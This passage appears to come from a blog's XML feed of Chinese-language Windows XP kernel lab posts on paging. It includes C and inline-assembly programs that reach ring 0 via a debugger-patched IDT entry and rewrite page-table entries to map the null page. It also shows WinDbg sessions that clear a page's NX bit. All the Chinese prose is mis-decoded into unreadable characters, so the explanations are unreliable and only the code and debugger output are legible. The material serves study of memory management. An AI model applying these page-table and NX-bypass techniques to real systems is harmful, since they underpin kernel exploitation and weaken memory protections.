class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//eq 8003f500  0040ee00`00081040</span></span><br><span class="line">    interrupt();</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/06/02/Windows-Kernel-Experiment-Interprocess-memory-access/image-20230602220050054.png" alt="image-20230602220050054"></p><p>è¿˜å¯ä»¥ç”¨æˆ‘ä»¬ä¹‹å‰çš„åšç³»ç»Ÿè°ƒç”¨çš„æ–¹æ³•å»å®ç°ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨æˆ–ä¸­æ–­æ¥åš</p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windowså†…æ ¸å®éªŒ:é›¶åœ°å€è¯»å†™</title>
      <link href="/2023/06/02/Windows-Kernel-Experiment-Zero-address-read-write/"/>
      <url>/2023/06/02/Windows-Kernel-Experiment-Zero-address-read-write/</url>
      
        <content type="html"><![CDATA[<h1 id="Windowså†…æ ¸å®éªŒ-é›¶åœ°å€è¯»å†™"><a href="#Windowså†…æ ¸å®éªŒ-é›¶åœ°å€è¯»å†™" class="headerlink" title="Windowså†…æ ¸å®éªŒ:é›¶åœ°å€è¯»å†™"></a>Windowså†…æ ¸å®éªŒ:é›¶åœ°å€è¯»å†™</h1><p>ä»¥åéƒ½æ˜¯paeæ¨¡å¼ä¸‹çš„å®éªŒ</p><p>é›¶åœ°å€å°±æ˜¯æˆ‘ä»¬çš„ç©ºæŒ‡é’ˆæŒ‡å‘çš„ä½ç½®å˜›ï¼Œ0è¿™å—åœ°å€(å‡†ç¡®çš„è¯´åº”è¯¥æ˜¯è¿™ä¸€ä¸ªé¡µ)æœ¬èº«å°±ä¼šè¢«æ ‡è®°ä¸ºä¸å¯è®¿é—®ï¼Œä»¥ä¾¿ä¸ºç©ºæŒ‡é’ˆæ£€æµ‹æä¾›äº›æ”¯æŒï¼Œè‚¯å®šæ˜¯ä¸èƒ½è¯»æˆ–å†™çš„</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; !pte <span class="number">0</span></span><br><span class="line">                    VA <span class="number">00000000</span></span><br><span class="line">PDE at C0600000            PTE at C0000000</span><br><span class="line">contains <span class="number">0000000008381067</span>  contains <span class="number">0000000000000000</span></span><br><span class="line">pfn <span class="number">8381</span>      ---DA--UWEV  not valid</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ä»–æ¯•ç«Ÿä¹Ÿæ˜¯è¿›ç¨‹è™šæ‹Ÿå†…å­˜çš„ä¸€å—å˜›ï¼Œè™šæ‹Ÿå†…å­˜éƒ½æ˜¯é é¡µç›®å½•è¡¨é¡¹å’Œé¡µè¡¨é¡¹æè¿°çš„ï¼Œå»æŠŠä»–æ˜ å°„åˆ°ç‰©ç†å†…å­˜ï¼Œæ‰€æœ‰ç†è®ºä¸ŠæŠŠä»–çš„é¡µè¡¨é¡¹çš„æ”¹æ‰å°±å¯ä»¥æäº‹æƒ…</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PDE(x) (DWORD64 *) (((x &gt;&gt; 21) &lt;&lt; 3) + 0xc0600000)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE(x) (DWORD64 *) (((x &gt;&gt; 12) &lt;&lt; 3) + 0xc0000000)</span></span><br><span class="line"><span class="comment">//004197B0</span></span><br><span class="line">DWORD g_var = <span class="number">0x12345678</span>;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;<span class="comment">//è£¸å‡½æ•°ä¸ä¼šå¸®æˆ‘ä»¬ç”Ÿæˆæ ˆå¸§ï¼Œå•çº¯ä¸€ä¸ªcall</span></span><br><span class="line">    *PTE(<span class="number">0</span>) = *PTE(<span class="number">0x04197B0</span>);</span><br><span class="line">    __asm &#123;</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//eq 8003f500  0040ee00`00081040</span></span><br><span class="line">    interrupt();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&amp;g_var:%p\n&quot;</span>,&amp;g_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;g_var:%x\n&quot;</span>,g_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0:%x\n&quot;</span>,*(DWORD*)<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x7b0:%x\n&quot;</span>,*(DWORD *)<span class="number">0x7b0</span>);</span><br><span class="line">    *(DWORD*)<span class="number">0x7b0</span> = <span class="number">0xffffff</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;g_var:%x\n&quot;</span>,g_var);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&amp;g_var:<span class="number">004197B</span>0</span><br><span class="line">g_var:<span class="number">12345678</span></span><br><span class="line"><span class="number">0</span>:<span class="number">462</span>aabc5</span><br><span class="line"><span class="number">0x7b0</span>:<span class="number">12345678</span></span><br><span class="line">g_var:ffffff</span><br><span class="line">è¯·æŒ‰ä»»æ„é”®ç»§ç»­. . .</span><br></pre></td></tr></table></figure><p>ç”±äºé¡µè¡¨é¡¹æè¿°çš„æ˜¯4kå¤§å°é¡µé¢ï¼Œæ‰€ä»¥ç›¸å½“äº00419000-0041a000å’Œ0-1000å¤„æ˜ å°„åˆ°åŒä¸€å—ç‰©ç†é¡µé¢</p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windowså†…æ ¸å®éªŒ:PAEåˆ†é¡µ(PAE paging)</title>
      <link href="/2023/06/02/Windows-Kernel-Experiment-PAE-paging/"/>
      <url>/2023/06/02/Windows-Kernel-Experiment-PAE-paging/</url>
      
        <content type="html"><![CDATA[<h1 id="Windowså†…æ ¸å®éªŒ-PAEåˆ†é¡µ-PAE-paging"><a href="#Windowså†…æ ¸å®éªŒ-PAEåˆ†é¡µ-PAE-paging" class="headerlink" title="Windowså†…æ ¸å®éªŒ:PAEåˆ†é¡µ(PAE paging)"></a>Windowså†…æ ¸å®éªŒ:PAEåˆ†é¡µ(PAE paging)</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">multi(<span class="number">0</span>)disk(<span class="number">0</span>)rdisk(<span class="number">0</span>)partition(<span class="number">1</span>)\WINDOWS=<span class="string">&quot;Microsoft Windows XP Home Edition DEBUG&quot;</span> /noexecute=optin /fastdetect /debugport=COM1 /baudrate=<span class="number">115200</span></span><br></pre></td></tr></table></figure><h2 id="ç†è®º"><a href="#ç†è®º" class="headerlink" title="ç†è®º"></a>ç†è®º</h2><p>æ—¶ä»£å‘å±•ï¼Œ32ä½åœ°å€æ€»çº¿æ”¯æŒæœ€å¤§4gçš„ç‰©ç†å†…å­˜è¶Šæ¥è¶Šä¸å¤Ÿç”¨æ¥ï¼Œå°±å‡ºç°äº†36ä½åœ°å€æ€»çº¿çš„å¤„ç†å™¨ï¼Œç†è®ºä¸Šæ”¯æŒæœ€å¤§64gçš„ç‰©ç†å†…å­˜ï¼Œä¸ºäº†å¯»å€å¤§äº4Gçš„ç‰©ç†å†…å­˜ï¼Œå‡ºç°äº†PAEåˆ†é¡µçš„æ–¹å¼</p><p>è¿™æ˜¯ä¸€ç§ä¸‰çº§åˆ†é¡µçš„çš„æ–¹å¼ï¼Œæ¯”äºŒçº§åˆ†é¡µå¤šäº†ä¸€çº§å«åš**é¡µç›®å½•æŒ‡é’ˆè¡¨PDPT(Page Directory Pointer Table)**çš„ç¬¬ä¸€çº§ï¼Œä¸ºäº†å¯»å€36ä½åœ°å€æ€»çº¿çš„ç‰©ç†å†…å­˜ï¼Œé¡µç›®å½•è¡¨é¡¹(PDE),é¡µè¡¨é¡¹(PTE),é¡µç›®å½•æŒ‡é’ˆ(PDPTE)éƒ½å˜ä¸ºäº†8å­—èŠ‚(4å­—èŠ‚åªèƒ½æè¿°2<sup>32-12</sup>*4kb&#x3D;4Gçš„ç‰©ç†å†…å­˜ï¼Œè¦æè¿°64Gè‡³å°‘éœ€è¦36-12&#x3D;24ä½æ¥æè¿°é¡µåŸºå€ï¼Œå³éœ€è¦36bitæ¥åšè¡¨é¡¹ï¼Œå¹²è„†å¯¹é½8byteç®—äº†ï¼Œæ‰€ä»¥ä»ç†è®ºä¸Šæ˜¯æ”¯æŒ2<sup>64-12</sup>*4Kbå¤§å°ç‰©ç†å†…å­˜),è¿™æ ·ä¸€ä¸ªé¡µåªèƒ½å­˜æ”¾4096&#x2F;8&#x3D;512ä¸ªé¡µè¡¨é¡¹ï¼Œæ‰€ä»¥éœ€è¦9ä¸ªä½æ¥å¯»æ‰¾ï¼Œé¡µç›®å½•é¡¹ä¹Ÿæ˜¯å¦‚æ­¤ï¼Œå°±å½¢æˆäº†2 9 9 12 åˆ†é¡µ</p><p><img src="/2023/06/02/Windows-Kernel-Experiment-PAE-paging/image-20230602134150946.png" alt="image-20230602134150946"></p><p>NOTES:</p><ul><li>å…¶ä¸­Mæ˜¯MAXPHYADDRçš„ç¼©å†™(å¯ä»¥ç†è§£ä¸ºåœ°å€æ€»çº¿ä½æ•°)ï¼Œæœ¬ä¾‹å­M&#x3D;36</li><li>CR3åªæœ‰åœ¨intel-64æ¶æ„æœ‰64ä½</li><li>ä¿ç•™ä½å¿…é¡»ä¸º0</li><li>XDä½ï¼Œå¦‚æœ IA32_EFER.NXEæ ‡å¿—ä½ç­‰äº1ï¼Œè¯¥ä½ä¸º1 åˆ™è¯¥é¡µä¸­çš„æ•°æ®(æˆ–è¯¥é¡¹æŒ‡å‘çš„é¡µè¡¨ä¸­çš„æ‰€æœ‰é¡µ)ä¸å¯æ‰§è¡Œï¼ˆä»è¯¥é¡µä¸­è·å–æŒ‡ä»¤å°†è¢«ç¦æ­¢ï¼›IA32_EFER.NXEç­‰äº0ï¼Œè¯¥ä½ä½ä¿ç•™ä½ï¼Œå¿…é¡»å¡«0</li></ul><blockquote><p>PAEåˆ†é¡µæ—¶æ¯ä¸ªè¿›ç¨‹è™šæ‹Ÿå†…å­˜è¿˜æ˜¯2<sup>2</sup>*2<sup>9</sup>*2<sup>9</sup>*4KB&#x3D;4Gï¼Œä¸è¿‡ç³»ç»Ÿå¯ä½¿ç”¨çš„æ€»ç‰©ç†å†…å­˜å¤§äº†</p></blockquote><h4 id="PAEåˆ†é¡µè½¬æ¢è¿‡ç¨‹"><a href="#PAEåˆ†é¡µè½¬æ¢è¿‡ç¨‹" class="headerlink" title="PAEåˆ†é¡µè½¬æ¢è¿‡ç¨‹"></a>PAEåˆ†é¡µè½¬æ¢è¿‡ç¨‹</h4><p><img src="/2023/06/02/Windows-Kernel-Experiment-PAE-paging/image-20230602135849354.png" alt="image-20230602135849354"></p><h2 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h2><p>ä¾æ—§æ˜¯épaeçš„é‚£ä¸ªç¨‹åº</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">g_cr3:<span class="number">0x8c902a0</span></span><br><span class="line">local num address:<span class="number">004197B</span>0</span><br><span class="line">è¯·æŒ‰ä»»æ„é”®ç»§ç»­. . .</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; .formats cr4</span><br><span class="line">Evaluate expression:</span><br><span class="line">  Hex:     <span class="number">000006f</span>9</span><br><span class="line">  Decimal: <span class="number">1785</span></span><br><span class="line">  Decimal (<span class="type">unsigned</span>) : <span class="number">1785</span></span><br><span class="line">  Octal:   <span class="number">00000003371</span></span><br><span class="line">  Binary:  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000110</span> <span class="number">11111001</span></span><br><span class="line">  Chars:   ....</span><br><span class="line">  Time:    Thu Jan  <span class="number">1</span> <span class="number">08</span>:<span class="number">29</span>:<span class="number">45</span> <span class="number">1970</span></span><br><span class="line">  Float:   low <span class="number">2.50132e-042</span> high <span class="number">0</span></span><br><span class="line">  Double:  <span class="number">8.81907e-321</span></span><br></pre></td></tr></table></figure><p>cr4ç¬¬äº”ä½paeæ ‡å¿—ä½ä¸º1 å¼€å¯pae</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!process 0 0 test.exe</span></span><br><span class="line">Failed to get VadRoot</span><br><span class="line">PROCESS 815b6020  SessionId: 0  Cid: 0154    Peb: 7ffd3000  ParentCid: 04b8</span><br><span class="line">    DirBase: 08c902a0  ObjectTable: e24c4a90  HandleCount:  17.</span><br><span class="line">    Image: test.exe</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">.formats 004197B0</span></span><br><span class="line">Evaluate expression:</span><br><span class="line">  Hex:     004197b0</span><br><span class="line">  Decimal: 4298672</span><br><span class="line">  Decimal (unsigned) : 4298672</span><br><span class="line">  Octal:   00020313660</span><br><span class="line">  Binary:  00000000 01000001 10010111 10110000</span><br><span class="line">  Chars:   .A..</span><br><span class="line">  Time:    Fri Feb 20 02:04:32 1970</span><br><span class="line">  Float:   low 6.02372e-039 high 0</span><br><span class="line">  Double:  2.12383e-317</span><br></pre></td></tr></table></figure><p>è™šæ‹Ÿåœ°å€æŒ‰ç…§2-9-9-12åˆ†é¡µåˆ†å¼€</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00</span> <span class="comment">//0</span></span><br><span class="line"><span class="number">000000010</span> <span class="comment">//2</span></span><br><span class="line"><span class="number">000011001</span> <span class="comment">//0x19</span></span><br><span class="line"><span class="number">011110110000</span> <span class="comment">//0x7b0</span></span><br></pre></td></tr></table></figure><p>DirBaseå³ä¸ºé¡µç›®å½•æŒ‡é’ˆè¡¨ç‰©ç†åœ°å€08c902a0</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!dq 08c902a0 + 0</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">8c902a0 00000000`0ca6c001 00000000`0ca6d001</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°é¡µç›®å½•è¡¨ç‰©ç†åœ°å€0ca6c000</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!dq 0ca6c000 + 8 * 2</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ca6c010 00000000`0ca7c067 00000000`00000000</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°é¡µè¡¨ç‰©ç†åœ°å€0ca7c000</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!dq 0ca7c000 + 8 * 0x19</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ca7c0c8 80000000`0cc1f067 80000000`0cb78067</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°é¡µè¡¨é¡¹0cc1f000</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; !db <span class="number">0</span>cc1f000 + <span class="number">0x7b0</span></span><br><span class="line"># cc1f7b0 <span class="number">78</span> <span class="number">56</span> <span class="number">34</span> <span class="number">12</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> xV4.............</span><br></pre></td></tr></table></figure><p>!vtopéªŒè¯</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!vtop 08c902a0 004197B0</span></span><br><span class="line">X86VtoP: Virt 00000000004197b0, pagedir 0000000008c902a0</span><br><span class="line">X86VtoP: PAE PDPE 0000000008c902a0 - 000000000ca6c001</span><br><span class="line">X86VtoP: PAE PDE 000000000ca6c010 - 000000000ca7c067</span><br><span class="line">X86VtoP: PAE PTE 000000000ca7c0c8 - 800000000cc1f067</span><br><span class="line">X86VtoP: PAE Mapped phys 000000000cc1f7b0</span><br><span class="line">Virtual address 4197b0 translates to physical address cc1f7b0.</span><br></pre></td></tr></table></figure><h2 id="é¡µç›®å½•å’Œé¡µè¡¨åœ¨è™šæ‹Ÿå†…å­˜é‡Œçš„è¡¨ç°"><a href="#é¡µç›®å½•å’Œé¡µè¡¨åœ¨è™šæ‹Ÿå†…å­˜é‡Œçš„è¡¨ç°" class="headerlink" title="é¡µç›®å½•å’Œé¡µè¡¨åœ¨è™šæ‹Ÿå†…å­˜é‡Œçš„è¡¨ç°"></a>é¡µç›®å½•å’Œé¡µè¡¨åœ¨è™šæ‹Ÿå†…å­˜é‡Œçš„è¡¨ç°</h2><p><img src="/2023/06/02/Windows-Kernel-Experiment-PAE-paging/image-20230602130747486.png" alt="image-20230602130747486"></p><p>æ€»çš„å¤§å°å˜ä¸º2^2 * 2^9 * 2^9 * 8byte &#x3D; 8Mb æ‰€æœ‰é¡µç›®å½•ç§»åˆ°äº†0xc060 0000å¤„</p><p>ä¸€ä¸ªé¡µç›®å½•æŒ‡é’ˆè¡¨é¡¹æè¿°4k * 2^9 * 2^9 &#x3D; 1Gå†…å­˜</p><p>ä¸€ä¸ªé¡µç›®å½•é¡¹æè¿°4k * 2^9 &#x3D; 2Må†…å­˜ </p><p>ä¸€ä¸ªé¡µè¡¨é¡¹æè¿°4kå†…å­˜</p><p>é¡µç›®å½•æŒ‡é’ˆä¸æ”¾å…¥è™šæ‹Ÿå†…å­˜(ä¸»è¦æ˜¯é¡µç›®å½•æè¿°çš„å†…å­˜å¤ªå¤§äº†ï¼Œæ²¡å¿…è¦è®©è¿™ä¹ˆåˆ°ä¸€å—å†…å­˜çš„å±æ€§æ”¾åˆ°è¿›ç¨‹ç©ºé—´é‡Œè®©è¿›ç¨‹å»ä¿®æ”¹)ï¼Œå…¶ä½™è¡¨è®¡ç®—å…¬å¼ä¸º</p><p>é¡µè¡¨é¡¹åœ°å€&#x3D;((address &gt;&gt; 12) &lt;&lt; 3) + 0xc0000000</p><p>é¡µç›®å½•é¡¹åœ°å€ &#x3D; ((address &gt;&gt; 21) &lt;&lt;3) + 0xc0600000</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!process 0 0 test.exe</span></span><br><span class="line">Failed to get VadRoot</span><br><span class="line">PROCESS 815b6020  SessionId: 0  Cid: 0154    Peb: 7ffd3000  ParentCid: 04b8</span><br><span class="line">    DirBase: 08c902a0  ObjectTable: e24c4a90  HandleCount:  17.</span><br><span class="line">    Image: test.exe</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">.process /i 815b6020</span></span><br><span class="line">You need to continue execution (press &#x27;g&#x27; &lt;enter&gt;) for the context</span><br><span class="line">to be switched. When the debugger breaks in again, you will be in</span><br><span class="line">the new process context.</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">g</span></span><br><span class="line">Break instruction exception - code 80000003 (first chance)</span><br><span class="line">nt!RtlpBreakWithStatusInstruction:</span><br><span class="line">80528bdc cc              int     3</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">r cr3</span></span><br><span class="line">cr3=08c902a0</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!pte 004197B0</span></span><br><span class="line">                    VA 004197b0</span><br><span class="line">PDE at C0600010            PTE at C00020C8</span><br><span class="line">contains 000000000CA7C067  contains 800000000CC1F067</span><br><span class="line">pfn ca7c      ---DA--UWEV  pfn cc1f      ---DA--UW-V</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">?? ((<span class="number">0</span>x04197B0&gt;&gt; <span class="number">12</span>) &lt;&lt; <span class="number">3</span>) + <span class="number">0</span>xc0000000</span></span><br><span class="line">unsigned int 0xc00020c8</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">?? ((<span class="number">0</span>x04197B0&gt;&gt; <span class="number">21</span>) &lt;&lt; <span class="number">3</span>) + <span class="number">0</span>xc0600000</span></span><br><span class="line">unsigned int 0xc0600010</span><br></pre></td></tr></table></figure><p>åŒæ—¶å¯ä»¥çœ‹åˆ°pteä¸º800000000CC1F067æœ€é«˜ä½dxä¸º1è¡¨ç¤ºæ•°æ®ä¸å¯æ‰§è¡Œ â€”DAâ€“UW-V</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">dq C00020C8 l1</span></span><br><span class="line">c00020c8  80000000`0cc1f067</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!pte 004197B0</span></span><br><span class="line">                    VA 004197b0</span><br><span class="line">PDE at C0600010            PTE at C00020C8</span><br><span class="line">contains 000000000CA7C067  contains 800000000CC1F067</span><br><span class="line">pfn ca7c      ---DA--UWEV   pfn cc1f      ---DA--UW-V</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">eq C00020C8 00000000`0cc1f067</span></span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!pte 004197B0</span></span><br><span class="line">                    VA 004197b0</span><br><span class="line">PDE at C0600010            PTE at C00020C8</span><br><span class="line">contains 000000000CA7C067  contains 000000000CC1F067</span><br><span class="line">pfn ca7c      ---DA--UWEV   pfn cc1f      ---DA--UWEV</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æœ€é«˜ä½ä¿®æ”¹ä¸ºåæœ‰äº†å¯æ‰§è¡Œæƒé™E â€”DAâ€“UWEV</p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windowså†…æ ¸å®éªŒ:éPAEåˆ†é¡µ(Non-PAE paging)</title>
      <link href="/2023/06/01/Windows-Kernel-Experiment-Non-PAE-paging/"/>
      <url>/2023/06/01/Windows-Kernel-Experiment-Non-PAE-paging/</url>
      
        <content type="html"><![CDATA[<h1 id="Windowså†…æ ¸å®éªŒ-éPAEåˆ†é¡µ-Non-PAE-paging"><a href="#Windowså†…æ ¸å®éªŒ-éPAEåˆ†é¡µ-Non-PAE-paging" class="headerlink" title="Windowså†…æ ¸å®éªŒ:éPAEåˆ†é¡µ(Non-PAE paging)"></a>Windowså†…æ ¸å®éªŒ:éPAEåˆ†é¡µ(Non-PAE paging)</h1><p><strong>PAE(Physical Address Extension)</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">multi(<span class="number">0</span>)disk(<span class="number">0</span>)rdisk(<span class="number">0</span>)partition(<span class="number">1</span>)\WINDOWS=<span class="string">&quot;Microsoft Windows XP Home Edition DEBUG&quot;</span> /noexecute=optin /fastdetect /debugport=COM1 /baudrate=<span class="number">115200</span></span><br></pre></td></tr></table></figure><p>æŠŠåŸæ¥çš„noexecuteæ”¹ä¸ºexecute,æ¥å…³é—­pae</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">multi(<span class="number">0</span>)disk(<span class="number">0</span>)rdisk(<span class="number">0</span>)partition(<span class="number">1</span>)\WINDOWS=<span class="string">&quot;Microsoft Windows XP Home Edition DEBUG&quot;</span> /execute=optin /fastdetect /debugport=COM1 /baudrate=<span class="number">115200</span></span><br></pre></td></tr></table></figure><p>cr4å¯„å­˜å™¨çš„ç¬¬äº”ä½(ä»0å¼€å§‹)æ˜¯paeæ ‡è¯†ä½ï¼ŒéªŒè¯ä¸‹</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">.formats cr4</span></span><br><span class="line">Evaluate expression:</span><br><span class="line">  Hex:     000006d9</span><br><span class="line">  Decimal: 1753</span><br><span class="line">  Decimal (unsigned) : 1753</span><br><span class="line">  Octal:   00000003331</span><br><span class="line">  Binary:  00000000 00000000 00000110 11011001</span><br><span class="line">  Chars:   ....</span><br><span class="line">  Time:    Thu Jan  1 08:29:13 1970</span><br><span class="line">  Float:   low 2.45648e-042 high 0</span><br><span class="line">  Double:  8.66097e-321</span><br></pre></td></tr></table></figure><p>ç¬¬äº”ä½æ˜¯0ï¼Œæ²¡æœ‰å¼€å¯pae</p><h3 id="æµ‹è¯•ç¨‹åº"><a href="#æµ‹è¯•ç¨‹åº" class="headerlink" title="æµ‹è¯•ç¨‹åº"></a>æµ‹è¯•ç¨‹åº</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;windows.h&gt;</span></span><br><span class="line">DWORD local_num = 0x12345678;</span><br><span class="line">DWORD g_cr3;</span><br><span class="line">void __declspec(naked) IdtEntry() &#123;//è£¸å‡½æ•°ä¸ä¼šå¸®æˆ‘ä»¬ç”Ÿæˆæ ˆå¸§ï¼Œå•çº¯ä¸€ä¸ªcall</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax,cr3</span><br><span class="line">        mov g_cr3, eax</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">void interrupt() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        int 0x20</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">int main() &#123;</span><br><span class="line">    if (0x401040 != IdtEntry) &#123;</span><br><span class="line">        printf(&quot;IdtRntry address wrong&quot;);</span><br><span class="line">        system(&quot;pause&quot;);</span><br><span class="line">        exit(-1);</span><br><span class="line">    &#125;</span><br><span class="line">    //eq 8003f500  0040ee00`00081040</span><br><span class="line">    interrupt();</span><br><span class="line">    printf(&quot;g_cr3:0x%x\n&quot;, g_cr3);</span><br><span class="line">    printf(&quot;local num address:%p\n&quot;,&amp;local_num);</span><br><span class="line">    system(&quot;pause&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">g_cr3:<span class="number">0xdac000</span></span><br><span class="line">local num address:<span class="number">004197B</span>0</span><br><span class="line">è¯·æŒ‰ä»»æ„é”®ç»§ç»­. . .</span><br></pre></td></tr></table></figure><h3 id="ç‰©ç†åœ°å€è§£æè¿‡ç¨‹"><a href="#ç‰©ç†åœ°å€è§£æè¿‡ç¨‹" class="headerlink" title="ç‰©ç†åœ°å€è§£æè¿‡ç¨‹"></a>ç‰©ç†åœ°å€è§£æè¿‡ç¨‹</h3><p>windbg</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; !process <span class="number">0</span> <span class="number">0</span> test.exe</span><br><span class="line">Failed to get VadRoot</span><br><span class="line">PROCESS <span class="number">81398480</span>  SessionId: <span class="number">0</span>  Cid: <span class="number">01e4</span>    Peb: <span class="number">7f</span>fd9000  ParentCid: <span class="number">04</span>a8</span><br><span class="line">    DirBase: <span class="number">00</span>dac000  ObjectTable: e2571638  HandleCount:  <span class="number">15.</span></span><br><span class="line">    Image: test.exe</span><br></pre></td></tr></table></figure><p><img src="/2023/06/01/Windows-Kernel-Experiment-Non-PAE-paging/image-20230601151108340.png" alt="image-20230601151108340"></p><p>dirbaseå°±æ˜¯é¡µç›®å½•åœ°å€åŸºå€ï¼Œå°±æ˜¯cr3é‡Œçš„å€¼ ps: PDBR(Page Directory Base Register)</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">.formats 004197B0</span></span><br><span class="line">Evaluate expression:</span><br><span class="line">  Hex:     004197b0</span><br><span class="line">  Decimal: 4298672</span><br><span class="line">  